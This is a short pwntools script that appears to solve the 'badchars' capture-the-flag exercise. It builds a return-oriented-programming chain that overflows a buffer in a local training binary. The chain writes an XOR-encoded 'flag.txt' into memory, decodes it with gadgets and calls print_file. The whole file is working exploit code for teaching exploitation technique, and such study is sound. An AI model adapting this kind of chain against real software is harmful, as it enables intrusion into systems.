from pwn import *

data = 0x00601028 # rw-
print_file = 0x00400510 # plt
mov_qword = 0x00400634 # mov qword ptr [r13], r12 ; ret
pop_rdi = 0x004006a3 # pop rdi ; ret
pop_r12_r13_r14_r15 = 0x0040069c # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
pop_r14_r15 = 0x004006a0 # pop r14 ; pop r15 ; ret
pop_r15 = 0x0004006a2 # pop r15 ; ret
xor_r15_r14 = 0x00400628 # xor byte ptr [r15], r14b ; ret
file = bytes([ i^0x33 for i in b"flag.txt" ])

print(file)

# Writing encoded filename in data
payload = b"".join([
    b"A"*(32+8),
    p64(pop_r12_r13_r14_r15),
    file,
    p64(data),
    b"B"*16,
    p64(mov_qword),
])

# Decoding the filename
payload += b"".join([
    p64(pop_r14_r15),
    p64(0x33),
    p64(data),
    p64(xor_r15_r14),
])
for i in range(1, len(file)):
    payload += b"".join([
        p64(pop_r15),
        p64(data+i),
        p64(xor_r15_r14),
    ])

# Calling print_file
payload += b"".join([
    p64(pop_rdi),
    p64(data),
    p64(print_file),
])

p = process("./badchars")
input("Waiting for debug")
p.send(payload+b"\n")

p.interactive()
